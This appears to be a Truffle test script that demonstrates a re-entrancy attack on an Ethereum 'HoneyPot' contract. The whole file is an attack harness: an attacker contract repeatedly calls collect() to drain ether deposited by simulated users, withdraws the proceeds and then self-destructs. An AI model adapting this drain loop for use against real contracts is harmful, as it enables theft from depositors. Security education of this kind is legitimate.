

const HoneyPot = artifacts.require('HoneyPot');
const HoneyPotCollect = artifacts.require('HoneyPotCollect');

contract('Re-entrancy test', async (accounts) => 
{
    const zero = 0x0000000000000000000000000000000000000000;
    const ether = web3.utils.toWei('1', 'ether');

    let owner = accounts[0];
    console.log(`victim address is ${owner}`);
    let attacker = accounts[1];
    console.log(`attacker address is ${attacker}`);

    let user1 = accounts[5];
    let user2 = accounts[6];
    let user3 = accounts[7];

    let HoneyPotContract;
    let HoneyPotCollectContract;

    before(async () => 
    {
        await web3.eth.sendTransaction(
            { 
                from: attacker, 
                to: owner.address, 
                value: web3.utils.toBN(ether).mul(web3.utils.toBN(100)) 
            });

        HoneyPotContract = await HoneyPot.deployed({ from: owner, value: ether });
        HoneyPotCollectContract = await HoneyPotCollect.deployed(
           {arguments: [HoneyPotContract.address]}, { from: attacker });
        console.log(`deployed contracts successfully`);
    });
    
    describe('get() test', () => 
    {
        it('attacker uses the re-entrancy bug to drain funds', async () => 
        {
            console.log('accounts status before hack');
            
            let ownerBalance = await web3.eth.getBalance(owner);
            let attackerBalance = await web3.eth.getBalance(attacker);

            let user1Balance = await web3.eth.getBalance(user1);
            let user2Balance = await web3.eth.getBalance(user2);
            let user3Balance = await web3.eth.getBalance(user3);

            console.log('\nowner balance: ' + ownerBalance / ether);

            console.log('attacker balance: ' + attackerBalance / ether);
            console.log('user #1 balance: ' + user1Balance / ether);
            console.log('user #2 balance: ' + user2Balance / ether);
            console.log('user #3 balance: ' + user3Balance / ether);

            await HoneyPotContract.put(
                { 
                    from: user1, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(50)) 
                });
            await HoneyPotContract.put(
                { 
                    from: user2, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(50)) 
                });
            await HoneyPotContract.put(
                { 
                    from: user3, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(50)) 
                });

            let HoneyPotContractBalance = await web3.eth.getBalance(HoneyPotContract.address);
            let HoneyPotCollectContractBalance = await web3.eth.getBalance(HoneyPotCollectContract.address);

            console.log('HoneyPot balance: ' + HoneyPotContractBalance / ether);
            console.log('HoneyPotCollect balance: ' + HoneyPotCollectContractBalance / ether);

            console.log('\nperforming attack...');
            let currentIteration = 0;
            let maxIterations = 100;
            let triggerAmount = web3.utils.toBN(0.01 * ether);
            let leftoverAmount = web3.utils.toBN(0.001 * ether);
            let collectIterations = web3.utils.toBN(10);
            while(web3.utils.toBN(HoneyPotContractBalance)
                .gt(web3.utils.toBN(leftoverAmount))
                && maxIterations > currentIteration)
            {
                currentIteration++;
                console.log('\niteration ' + currentIteration);
                
                console.log('trigger amount ' + triggerAmount / ether);
               console.log(`attacker address is ${attacker}`);
               const _getOwner = await HoneyPotCollectContract.getOwner();
               console.log(`owner = attacker address = ${_getOwner}`);
                let amountToSend = web3.utils.toBN(triggerAmount);
                await HoneyPotCollectContract.collect(
                    collectIterations, 
                    { 
                        from: attacker, 
                        value: amountToSend
                    });
   
                HoneyPotContractBalance = await web3.eth.getBalance(HoneyPotContract.address);
                HoneyPotCollectContractBalance = await web3.eth.getBalance(HoneyPotCollectContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('HoneyPot balance ' + HoneyPotContractBalance / ether);
                console.log('HoneyPotCollect balance ' + HoneyPotCollectContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                await HoneyPotCollectContract.withdraw(
                    attacker, 
                    web3.utils.toBN(HoneyPotCollectContractBalance).mul(web3.utils.toBN(5)).div(web3.utils.toBN(10)), 
                    { from: attacker });
                console.log('transferred amount from HoneyPotCollect to attacker');

                HoneyPotContractBalance = await web3.eth.getBalance(HoneyPotContract.address);
                HoneyPotCollectContractBalance = await web3.eth.getBalance(HoneyPotCollectContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('HoneyPot balance ' + HoneyPotContractBalance / ether);
                console.log('HoneyPotCollect balance ' + HoneyPotCollectContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                triggerAmount = web3.utils.toBN(triggerAmount).mul(web3.utils.toBN(10));
                if(web3.utils.toBN(triggerAmount).gt(web3.utils.toBN(attackerBalance)))
                {
                    triggerAmount = web3.utils.toBN(attackerBalance).mul(web3.utils.toBN(8)).div(web3.utils.toBN(10));
                }
                if(web3.utils.toBN(triggerAmount).gt(web3.utils.toBN(HoneyPotContractBalance)))
                {
                    triggerAmount = web3.utils.toBN(HoneyPotContractBalance);
                }
            }

            await HoneyPotCollectContract.kill(attacker, { from: attacker });
            console.log('HoneyPotCollect contract killed');

            console.log('\nend');
            
            HoneyPotContractBalance = await web3.eth.getBalance(HoneyPotContract.address);
            HoneyPotCollectContractBalance = await web3.eth.getBalance(HoneyPotCollectContract.address);
            attackerBalance = await web3.eth.getBalance(attacker);

            console.log('HoneyPot balance ' + HoneyPotContractBalance / ether);
            console.log('HoneyPotCollect balance ' + HoneyPotCollectContractBalance / ether);
            console.log('attacker balance ' + attackerBalance / ether);
        });
    });

});